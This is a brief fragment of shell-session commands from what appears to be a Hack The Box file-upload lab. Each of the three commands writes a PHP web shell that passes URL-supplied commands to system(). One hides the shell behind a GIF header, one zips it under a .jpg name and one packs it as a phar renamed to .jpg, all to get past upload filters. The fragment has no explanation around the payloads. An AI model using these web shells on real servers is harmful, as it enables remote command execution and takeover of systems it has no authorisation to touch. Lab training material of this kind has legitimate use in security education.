...
```shell-session
trmchale@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
...
```shell-session
trmchale@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
...
```shell-session
trmchale@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
